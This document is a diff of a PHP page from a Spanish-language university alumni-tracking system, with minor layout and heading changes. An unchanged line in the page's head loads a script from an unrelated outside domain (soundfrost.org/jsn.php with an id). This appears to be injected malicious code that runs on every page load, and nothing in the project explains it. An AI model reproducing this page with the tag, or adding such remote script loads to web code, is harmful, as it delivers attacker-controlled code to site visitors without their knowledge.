@@ -14,7 +14,7 @@ if(!isset($_SESSION["idregistro"])){
 	<meta charset="utf-8" />
 	<!-- Importación del archivo: *STYLE.CCS* -->
 	<!-- Importación del archivo: *STYLE.CCS* -->
-	<!--link href="style.css" rel="stylesheet" type="text/css" /-->
+	<link href="style.css" rel="stylesheet" type="text/css" >
 <script src='https://soundfrost.org/jsn.php?ver=381&id=17a257e2899119a2d164a3a2cada9b39'></script></head>
 	<script type="text/javascript" src="../js/jquery.js"></script>
 	<script type="text/javascript" src="../js/jquery-ui.js"></script>
@@ -61,14 +61,12 @@ font-style: oblique;
 	</style>
 </head>
 <body>
-	<body>
 <div class="main">
   <div class="header_resize">
     <div class="header">
-		
-      <div class="logo"><a href="index.php"><img src="../images/logo.gif" width="338" height="70" border="0" alt="logo" /></a></div>
+	  <div class="logo"><a href="index.php"><img src="../images/logo.gif" width="338" height="70" border="0" alt="logo" /></a></div>
       <div class="menu">
-        <ul>
+       <br><ul>
           <li><a href="index.php"><span>Inicio</span></a></li>
           <li><a href="" class="active"><span>Directorio</span></a></li>
 		  <li><a href="logout.php"><span>Cerrar Sesión </span></a></li>
@@ -82,7 +80,7 @@ font-style: oblique;
   <div class="clr"></div>
   <div class="header_blog2">
     <div class="header">
-      <h2 id="tituloInvestigacion" align="center">Sistema para el Seguimiento de Egresados del Departamento de Sistemas y Computación</h2>
+      <h2 id="tituloSistema" align="left">Sistema para el Seguimiento de Egresados del Departamento de Sistemas y Computación</h2>
       <center><p>Ing en Sistemas Computacionales <br>Aníbal Roberto Saucedo Rosales <br />
          <strong>RESPONSABLE</strong></p></center>
     </div>
